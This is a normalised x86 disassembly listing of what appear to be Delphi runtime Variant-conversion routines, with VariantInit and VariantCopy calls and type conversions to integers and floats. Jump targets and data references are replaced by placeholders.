push esi
push ebx
call VariantCopy
call sub_40eb08
push 0x0
mov ecx esi
mov edx ebx
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x28 ]
jmp r-xdata
sub_40f1e0
push ebx
push esi
mov ebx edx
mov esi eax
cmp esi ebx
je r-xdata
pop esi
pop ebx
retn
test [ ebx ] 0xbfe8
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f134
test [ esi ] 0xbfe8
je r-xdata
mov eax [ ebx ]
mov [ esi ] eax
mov eax [ ebx + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0x8 ]
mov [ esi + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax esi
call sub_40ee3c
sub_40f224
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f280
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
lea eax [ ebp - 0x10 ]
call sub_40f1e0
lea eax [ ebp - 0x10 ]
call [ rw-data ]
movzx ecx di
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_40f4ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f287
lea eax [ ebp - 0x10 ]
call sub_40eeb8
retn
sub_40f290
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f2ce
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4128f8
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4132a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f2d5
lea eax [ ebp - 0x4 ]
call sub_404600
retn
sub_40f2dc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f31a
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_4121d0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41327c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f321
lea eax [ ebp - 0x4 ]
call sub_403f20
retn
sub_40f328
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f366
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412f9c
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_41330c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f36d
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
sub_40f374
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f3b2
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
call sub_412ed0
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_4132e0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f3b9
lea eax [ ebp - 0x4 ]
call sub_40578c
retn
sub_40f3c0
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov ax [ ebx ]
mov edx eax
and dx 0xfff
cmp dx 0x14
jb r-xdata
mov edx esi
and dx 0xfff
cmp dx 0x14
jae r-xdata
mov edx ebx
mov eax edi
mov ecx 0x8
call sub_40f4ac
push esi
push 0x0
push 0x400
push edi
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40eb14
jmp r-xdata
mov edx esi
call sub_40e680
push esi
push 0x0
push 0x400
push ebx
push edi
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov ecx esi
call sub_40eb14
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_40f440
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov ebx edx
mov edi eax
mov bp [ ebx ]
cmp bp 0x101
jne r-xdata
mov edx esp
mov eax ebp
call sub_4143cc
test al al
je r-xdata
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f224
jmp r-xdata
mov edx esp
mov eax esi
call sub_4143cc
test al al
je r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx esi
call sub_40f3c0
mov ecx ebx
mov edx edi
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
sub_40f4ac
push ebx
push esi
mov ebx edx
mov esi eax
mov ax [ ebx ]
movzx edx ax
cmp ecx edx
jne r-xdata
cmp ax 0x400c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40f1e0
pop esi
pop ebx
retn
mov edx ecx
cmp edx 0x14
ja r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f4ac
jmp r-xdata
mov edx ecx
sub edx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f4f1 ]
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_40f2dc
jmp r-xdata
dec edx
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax esi
call sub_40ec20
jmp r-xdata
mov eax ebx
call sub_40fe18
mov edx eax
mov eax esi
call sub_413124
jmp r-xdata
mov eax ebx
call sub_40f870
mov edx eax
mov eax esi
call sub_413084
jmp r-xdata
mov eax ebx
call sub_4111dc
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax esi
call sub_413170
jmp r-xdata
mov eax ebx
call sub_410e44
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_413194
jmp r-xdata
mov eax ebx
call sub_411b1c
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax esi
call sub_4131c0
jmp r-xdata
mov eax ebx
call sub_4115b4
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax esi
call sub_4131ec
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f290
jmp r-xdata
mov eax ebx
call sub_410930
mov edx eax
mov eax esi
call sub_413218
jmp r-xdata
mov eax ebx
call sub_40fcc0
mov edx eax
mov eax esi
call sub_413104
jmp r-xdata
mov eax ebx
call sub_40fd70
mov edx eax
mov eax esi
call sub_4130a4
jmp r-xdata
mov eax ebx
call sub_40ff10
mov edx eax
mov eax esi
call sub_4130c4
jmp r-xdata
mov eax ebx
call sub_40ffe8
mov edx eax
mov eax esi
call sub_4130e4
jmp r-xdata
mov eax ebx
call sub_410334
push edx
push eax
mov eax esi
call sub_413144
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f328
jmp r-xdata
mov edx ebx
mov eax esi
call sub_40f374
jmp r-xdata
mov dx 0x101
call sub_40e680
jmp r-xdata
jmp r-xdata
mov eax esi
call sub_40eeb8
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_40f440
xor edx edx
mov ax 0x1
call sub_40e680
jmp r-xdata
sub_40f6d8
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40f77b
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x8 ]
call sub_4128f8
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0x8 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
sub edx 0x80020005
je r-xdata
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
call sub_4041a8
mov eax [ ebp - 0xc ]
lea edx [ ebp - 0x4 ]
call sub_4081e4
test al al
jne r-xdata
sub edx 0x7ffdfffb
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f782
lea eax [ ebp - 0xc ]
call sub_403f20
lea eax [ ebp - 0x8 ]
call sub_404600
retn
mov eax ebx
call sub_410930
and eax 0x7f
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov dx [ ebx ]
mov cx 0x3
call sub_40eb14
jmp r-xdata
sub_40f78c
push ebx
add esp 0xfffffff0
mov ebx eax
push esp
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x3
call sub_40eb14
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
retn
sub_40f7c8
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f81c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x14 ]
call sub_40f1e0
lea eax [ ebp - 0x14 ]
call [ rw-data ]
lea eax [ ebp - 0x14 ]
call sub_40f870
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f823
lea eax [ ebp - 0x14 ]
call sub_40eeb8
retn
sub_40f82c
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4143cc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x3
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
sub_40f870
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40fc91
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f8a3 ]
mov eax [ ebp - 0x4 ]
call sub_40f6d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
dec dx
je r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f6d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ eax + 0x8 ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f870
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f78c
mov [ ebp - 0x8 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f7c8
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov dx 0x3
mov ax 0x1
call sub_40e680
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebp - 0x4 ]
test ah 0x40
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_40f82c
test al al
jne r-xdata
mov edx [ ebp - 0x4 ]
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f78c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_40f78c
mov [ ebp - 0x8 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_40fac7 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fild [ eax ]
fdiv [ r-xdata ]
call sub_402960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
fld [ eax ]
call sub_402960
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_40f6d8
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movsx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
movzx eax [ eax ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax [ eax ]
push eax
sar eax 0x1f
cmp eax edx
pop eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40f870
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
mov [ ebp - 0x8 ] eax
jmp r-xdata
call sub_4030d0
sub_40fcc0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x10
mov ax 0x1
call sub_40e680
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x5
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fd4c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f870
mov ebx eax
add ebx 0x80
cmp ebx 0xff
jbe r-xdata
add ebx 0xffffff80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030d0
sub_40fd70
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
sub ax 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
sub ax 0xa
je r-xdata
xor ebx ebx
jmp r-xdata
mov dx 0x11
mov ax 0x1
call sub_40e680
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
sub ax 0x6
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bl [ ebx + 0x8 ]
jmp r-xdata
jmp r-xdata
xor eax eax
push ebp
push sub_40fdf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f870
mov ebx eax
cmp ebx 0xff
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030d0
sub_40fe18
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x11
ja r-xdata
xor eax eax
push ebp
push sub_40feec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f870
mov ebx eax
add ebx 0x8000
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40fe3e ]
jmp [ eax * 4 + jump_table_40fe50 ]
add ebx 0xffff8000
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030d0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x2
mov ax 0x1
call sub_40e680
sub_40ff10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x12
ja r-xdata
xor eax eax
push ebp
push sub_40ffc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40f870
mov ebx eax
cmp ebx 0xffff
jbe r-xdata
mov al [ eax + lookup_table_40ff32 ]
jmp [ eax * 4 + jump_table_40ff45 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030d0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov bx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x12
mov ax 0x1
call sub_40e680
sub_40ffe8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax ]
cmp eax 0x13
ja r-xdata
xor eax eax
push ebp
push sub_4100ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_410334
test edx edx
je r-xdata
mov al [ eax + lookup_table_41000e ]
jmp [ eax * 4 + jump_table_410022 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_4030d0
xor ebx ebx
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
movsx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
movzx ebx [ ebx + 0x8 ]
jmp r-xdata
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx + 0x8 ]
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor ebx ebx
jmp r-xdata
mov dx 0x13
mov ax 0x1
call sub_40e680
sub_4100d0
push ebx
add esp 0xffffffe8
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
call VariantInit
push 0x3
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
push 0x5
push 0x0
push 0x400
push ebx
lea eax [ esp + 0x18 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
cdq
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ esp + 0x10 ]
call sub_402960
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
mov eax [ esp ]
mov edx [ esp + 0x4 ]
add esp 0x18
pop ebx
retn
mov dx [ ebx ]
mov cx 0x14
call sub_40eb14
mov [ esp ] 0x0
mov [ esp + 0x4 ] 0x0
mov eax ebx
call sub_410930
and eax 0x7f
xor edx edx
mov [ esp ] eax
mov [ esp + 0x4 ] edx
jmp r-xdata
sub_41017c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0xc ] edx
mov ebx eax
xor eax eax
push ebp
push sub_41026a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0xc ]
call sub_4128f8
lea eax [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
call sub_4041a8
mov eax [ ebp - 0x1c ]
lea edx [ ebp - 0x8 ]
call sub_408204
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410271
lea eax [ ebp - 0x1c ]
call sub_403f20
lea eax [ ebp - 0xc ]
call sub_404600
retn
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x400
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
cmp eax 0x80020005
jne r-xdata
fld [ ebp - 0x18 ]
call sub_402960
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
mov dx [ ebx ]
mov cx 0x14
call sub_40eb14
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax ebx
call sub_410930
and eax 0x7f
xor edx edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
jmp r-xdata
sub_41027c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_4102d3
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x18 ]
call sub_40f1e0
lea eax [ ebp - 0x18 ]
call [ rw-data ]
lea eax [ ebp - 0x18 ]
call sub_410334
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4102da
lea eax [ ebp - 0x18 ]
call sub_40eeb8
retn
sub_4102e8
push ebx
push esi
push edi
add esp 0xffffffec
mov edi edx
mov esi eax
mov edx esp
mov ax [ esi ]
call sub_4143cc
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
add esp 0x14
pop edi
pop esi
pop ebx
retn
lea eax [ esp + 0x4 ]
push eax
call VariantInit
push 0x14
mov ecx esi
lea edx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
mov esi [ eax ]
call [ esi + 0x1c ]
mov eax [ esp + 0xc ]
mov [ edi ] eax
mov eax [ esp + 0x10 ]
mov [ edi + 0x4 ] eax
sub_410334
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_410740
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx [ ebp - 0x4 ]
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_410367 ]
mov eax [ ebp - 0x4 ]
call sub_41017c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
dec dx
je r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fild [ eax + 0x8 ]
fdiv [ r-xdata ]
call sub_402960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0x8 ]
call sub_402960
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41017c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movsx eax [ eax + 0x8 ]
cdq
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_410334
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4100d0
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41027c
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] edx
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xc ] 0x0
